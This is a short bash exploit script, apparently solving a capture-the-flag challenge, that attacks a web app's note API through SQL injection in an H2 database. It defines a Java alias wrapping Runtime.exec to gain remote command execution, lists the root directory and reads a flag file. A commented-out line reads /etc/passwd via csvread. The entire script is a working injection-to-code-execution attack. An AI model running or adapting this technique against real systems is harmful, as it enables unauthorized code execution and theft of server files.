#!/bin/bash

# This exploit takes advantage of an SQL injection on an H2 database
# It's possible to define an alias to a java function and therefore achieve code execution
# https://www.sonarsource.com/blog/dotcms515-sqli-to-rce/

HOST='localhost:1337'
HOST='94.237.59.180:33051'
COOKIE_JAR=$(mktemp)

# login
curl -s "http://${HOST}/login" --data 'username=user&password=123' --cookie-jar $COOKIE_JAR

# # read /etc/passwd file
# curl -s \
#     -b $COOKIE_JAR \
#     --form $'name="xxx\' union select 0, H2VERSION(), * from csvread(\'/etc/passwd\',\'*\'); --"' \
#     "http://${HOST}/api/note" #| jq -r '.[].Note'

functionname=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 12)
curl -s \
    -b $COOKIE_JAR \
    --form $"name=\"xxx'; CREATE ALIAS ${functionname} AS \'String execve(String cmd) throws java.io.IOException { return (new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\\\"\\000A\\\")).next(); }'; --\"" \
    "http://${HOST}/api/note" >/dev/null

flag_name=$(curl -s \
    -b $COOKIE_JAR \
    --form $"name=\"xxx' union select 0, 'a', ${functionname}('ls /'); --\"" \
    "http://${HOST}/api/note" | jq -r '.[].Note' | grep flag)

curl -s \
    -b $COOKIE_JAR \
    --form $"name=\"xxx' union select 0, 'a', ${functionname}('cat /${flag_name}'); --\"" \
    "http://${HOST}/api/note" | jq -r '.[].Note'
